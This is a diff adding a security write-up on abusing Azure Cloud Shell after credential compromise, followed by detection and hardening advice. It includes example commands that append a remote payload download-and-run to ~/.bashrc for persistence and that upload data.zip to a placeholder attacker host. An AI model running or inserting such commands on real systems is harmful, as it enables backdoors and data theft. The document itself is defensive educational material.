@@ -1,0 +1,464 @@
+# Azure Cloud Shell
+
+## Reconnaissance
+
+Azure Cloud Shell is a Microsoft-managed, sandboxed command-line environment designed for secure Azure administration. By design, it is not inherently vulnerable.
+
+However, Cloud Shell can become a powerful post-compromise attack surface when combined with:
+
+* Overprivileged RBAC roles (for example, Contributor or Owner)
+* Misconfigured Storage Accounts
+* Weak identity and access controls
+* Inadequate monitoring and governance
+
+> **Important:** Direct cross-account command execution through IMG file manipulation is not a default or common attack path. Such a scenario would require specific storage misconfigurations and elevated permissions beyond what is typically granted to Contributor-level users.
+
+### Realistic Security Impact
+
+Potential impacts include:
+
+* Privilege escalation through RBAC abuse
+* Credential and token theft
+* Persistence through shell profile modification
+* Data exfiltration using trusted Azure infrastructure
+* Lateral movement across Azure resources
+
+---
+
+## Attacker Workflow
+
+### 1. Initial Access
+
+An attacker first obtains valid Azure credentials through methods such as:
+
+* Phishing
+* Token theft
+* Password spraying
+* Credential stuffing
+* Session hijacking
+
+The attacker then:
+
+* Authenticates to the Azure Portal
+* Launches Azure Cloud Shell
+
+---
+
+### 2. Discovery and Enumeration
+
+Once Cloud Shell access is obtained, the attacker performs reconnaissance to identify:
+
+* RBAC roles and assignments
+* Azure subscriptions
+* Storage Accounts (including Cloud Shell storage)
+* Key Vaults
+* Virtual Machines
+* Managed Identities
+* Azure services and resources
+
+#### Example Commands
+
+```bash
+az account show
+az role assignment list --all
+az resource list
+```
+
+---
+
+### 3. Storage Enumeration (Conditional Step)
+
+The attacker attempts to identify and access the Storage Account backing Cloud Shell.
+
+Typical objectives include:
+
+* Locating Azure File Shares
+* Reviewing storage permissions
+* Identifying exposed access keys or SAS tokens
+
+#### Constraints
+
+Access to another user's Cloud Shell storage is not guaranteed and depends on:
+
+* Storage RBAC permissions
+* Shared Key usage
+* Identity-based access controls
+* Storage Account configuration
+
+---
+
+### 4. Persistence
+
+#### Primary Method (Realistic)
+
+Modify shell startup profiles:
+
+```bash
+~/.bashrc
+~/.profile
+```
+
+Example:
+
+```bash
+echo "curl http://attacker/payload.sh | bash" >> ~/.bashrc
+```
+
+This causes the payload to execute whenever the user starts a Cloud Shell session.
+
+#### Secondary Method (Conditional / Less Common)
+
+If storage permissions are improperly configured, an attacker may:
+
+* Tamper with Cloud Shell storage files
+* Modify shared scripts
+* Replace administrative tooling
+
+> **Note:** IMG file modification is not considered a standard or widely exploitable persistence mechanism and requires specific environmental conditions.
+
+---
+
+### 5. Privilege Escalation
+
+#### Common Paths
+
+* Misconfigured RBAC assignments
+* Contributor-to-Owner escalation opportunities
+* Abuse of role assignment permissions
+* Privileged Identity Management (PIM) misconfigurations
+* Managed Identity token abuse
+* Access to service principals with elevated permissions
+
+---
+
+### 6. Lateral Movement
+
+An attacker may leverage existing Azure authentication artifacts to move throughout the environment.
+
+Examples include:
+
+* Reusing Azure CLI tokens
+* Accessing Virtual Machines
+* Accessing Key Vaults
+* Accessing Storage Accounts
+* Accessing Azure DevOps pipelines
+* Accessing managed identities
+* Enumerating additional subscriptions and tenants
+
+---
+
+### 7. Data Exfiltration
+
+Data can be exfiltrated using standard command-line tools and trusted outbound connections.
+
+Examples:
+
+```bash
+curl -X POST -F "file=@data.zip" http://attacker/upload
+```
+
+Other methods include:
+
+* External storage endpoints
+* Web APIs
+* Cloud-hosted file-sharing services
+
+---
+
+## Attack Vectors
+
+### Overprivileged RBAC
+
+**Status:** Primary Risk
+
+Excessive permissions can enable:
+
+* Privilege escalation
+* Resource manipulation
+* Unauthorized access to sensitive services
+
+### Misconfigured Storage Accounts
+
+**Status:** Common Risk
+
+Improper storage permissions may enable:
+
+* Data exposure
+* Persistence opportunities
+* Unauthorized file modification
+
+### Shell Profile Persistence
+
+**Status:** Realistic
+
+Modification of startup scripts enables recurring code execution whenever Cloud Shell is launched.
+
+### Token and Session Reuse
+
+**Status:** High Impact
+
+Compromised authentication tokens can provide direct access to Azure resources without requiring password re-entry.
+
+### IMG File Manipulation
+
+**Status:** Rare / Conditional
+
+Requires unusual storage configurations and elevated permissions. Not considered a common attack technique.
+
+---
+
+# Tools Commonly Used
+
+### PowerZure
+
+Purpose:
+
+* Azure enumeration
+* Privilege escalation analysis
+* Attack path identification
+
+### AzureHound
+
+Purpose:
+
+* Azure AD and Entra ID relationship mapping
+* Attack path visualization
+
+### ROADtools
+
+Purpose:
+
+* Token analysis
+* Azure AD reconnaissance
+* Identity assessment
+
+### Azucar
+
+Purpose:
+
+* Azure security posture assessment
+* Configuration review
+
+### ScoutSuite
+
+Purpose:
+
+* Multi-cloud security auditing
+* Misconfiguration discovery
+
+---
+
+# Additional Attack Scenarios
+
+## 1. Credential and Token Harvesting
+
+Targets may include:
+
+* Azure CLI tokens
+* Environment variables
+* Stored secrets
+* Authentication artifacts
+
+**Risk:** High
+
+**Impact:**
+
+* Session hijacking
+* Lateral movement
+* Identity impersonation
+
+---
+
+## 2. Malicious Script Execution (Persistence)
+
+Attackers may backdoor:
+
+* `.bashrc`
+* `.profile`
+* Shared administrative scripts
+
+**Risk:** Medium
+
+**Impact:**
+
+* Persistent access
+* Stealthy code execution
+
+---
+
+## 3. Data Exfiltration
+
+Potential targets include:
+
+* Storage Account data
+* Key Vault secrets
+* Configuration files
+* Sensitive business information
+
+**Risk:** High
+
+**Impact:**
+
+* Data breach
+* Intellectual property loss
+* Regulatory exposure
+
+---
+
+## 4. Resource Manipulation
+
+Attackers may:
+
+* Modify Azure resources
+* Disable security controls
+* Delete workloads
+* Change network configurations
+
+**Risk:** Medium
+
+**Impact:**
+
+* Service disruption
+* Security degradation
+* Operational outages
+
+---
+
+## 5. Cloud Shell as an Execution Proxy
+
+Cloud Shell can be used as a trusted execution platform to:
+
+* Run administrative commands
+* Access Azure resources
+* Blend malicious activity with legitimate administrator actions
+
+**Risk:** Medium
+
+**Impact:**
+
+* Defense evasion
+* Reduced visibility
+* Operational abuse
+
+---
+
+# Risk Severity and Impact
+
+### RBAC Privilege Escalation
+
+**Risk Severity:** High
+
+**Impact:** Elevation to Owner or equivalent privileged roles.
+
+### Token Theft
+
+**Risk Severity:** High
+
+**Impact:** Complete session impersonation and unauthorized access.
+
+### Storage Misconfiguration
+
+**Risk Severity:** High
+
+**Impact:** Data exposure, unauthorized access, and potential persistence opportunities.
+
+### Profile-Based Persistence
+
+**Risk Severity:** Medium
+
+**Impact:** Recurrent code execution during Cloud Shell startup.
+
+### Data Exfiltration
+
+**Risk Severity:** High
+
+**Impact:** Exposure of sensitive organizational data.
+
+### IMG Manipulation
+
+**Risk Severity:** Low
+
+**Impact:** Limited and highly dependent on specific storage misconfigurations.
+
+---
+
+# Remediation and Recommendations
+
+## Identity Security (Highest Priority)
+
+* Enforce Multi-Factor Authentication (MFA)
+* Implement Conditional Access policies
+* Restrict access by device and location
+* Disable legacy authentication methods
+* Monitor anomalous sign-in activity
+
+---
+
+## RBAC Hardening
+
+* Apply least-privilege principles
+* Avoid broad Contributor assignments
+* Regularly review privileged role assignments
+* Implement Privileged Identity Management (PIM)
+* Require approval workflows for elevated access
+
+---
+
+## Storage Security
+
+* Disable public access where not required
+* Prefer RBAC over Shared Key authentication
+* Monitor Azure File Share activity
+* Rotate access keys regularly
+* Audit Storage Account permissions
+
+---
+
+## Monitoring and Detection
+
+Enable and monitor:
+
+* Azure Activity Logs
+* Microsoft Entra ID Sign-In Logs
+* Storage Access Logs
+* Azure Monitor
+* Microsoft Sentinel
+
+Recommended detections include:
+
+* Unusual Cloud Shell activity
+* Unauthorized role assignments
+* Suspicious storage access
+* Token abuse indicators
+* Persistence-related file modifications
+
+---
+
+## Cloud Shell Governance
+
+* Restrict Cloud Shell usage when not required
+* Monitor Cloud Shell session activity
+* Avoid using Cloud Shell with permanently privileged accounts
+* Periodically review Cloud Shell storage resources
+* Establish logging and retention requirements
+
+---
+
+# Final Takeaway
+
+Azure Cloud Shell is:
+
+- Secure by design
+- Not directly exploitable under normal conditions
+- A valuable administrative tool for Azure operations
+
+However, risk emerges when Cloud Shell is combined with:
+
+* Weak identity controls
+* Excessive RBAC permissions
+* Storage misconfigurations
+* Insufficient monitoring
+
+The primary security concern is not Cloud Shell itself, but rather who can access it and what permissions they possess once authenticated.
+
+In most real-world scenarios, successful abuse of Cloud Shell is a consequence of identity compromise, privilege mismanagement, or storage configuration weaknesses rather than a vulnerability in Cloud Shell itself.
